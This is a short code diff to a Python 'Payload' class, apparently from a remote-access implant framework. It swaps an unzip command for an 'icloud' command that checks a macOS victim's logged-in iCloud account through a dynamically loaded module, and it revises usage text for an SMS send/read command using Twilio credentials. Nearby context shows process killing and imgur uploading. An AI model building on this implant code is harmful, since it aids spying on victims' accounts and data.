@@ -504,23 +504,15 @@ class Payload():
             taskkill.start()
             sys.exit()
 
-    @config(platforms=['win32','linux2','darwin'], command=True, usage='unzip <file>')
-    def unzip(self, path):
+    @config(platforms=['darwin'], command=True, usage='icloud')
+    def icloud(self):
         """
-        Unzip a compressed archive/file
-
-        `Required`
-        :param str path:    zip archive filename
-
+        Check for logged in iCloud account on macOS
+        
         """
-        if os.path.isfile(path):
-            try:
-                _ = zipfile.ZipFile(path).extractall('.')
-                return os.path.splitext(path)[0]
-            except Exception as e:
-                log("{} error: {}".format(self.unzip.func_name, str(e)))
-        else:
-            return "File '{}' not found".format(path)
+        if 'icloud' not in globals():
+            globals()['icloud'] = self.load('icloud')
+        return globals()['icloud'].run()
 
     @config(platforms=['win32','linux2','darwin'], command=True, usage='sms <send/read> [args]')
     def phone(self, args):
@@ -543,7 +535,7 @@ class Payload():
         if all():
             return globals()['phone'].run(number=args.number, message=args.message, sid=args.sid, token=args.token)
         else:
-            return 'usage: <send/read> [args]\n  arguments:\n\tphone    :   phone number with country code - no spaces (ex. 18001112222)\n\tmessage :   text message to send surrounded by quotes (ex. "example text message")'
+            return 'usage: <send/read> [args]\n  arguments:\n\tnumber: phone number with country code - no spaces (ex. 18001112222)\n\tmessage: text message to send surrounded by quotes (ex. "example text message")\n\tsid: twilio account SID\n\ttoken: twilio auth token'
 
     @config(platforms=['win32','linux2','darwin'], command=False)
     def imgur(self, source, api_key=None):
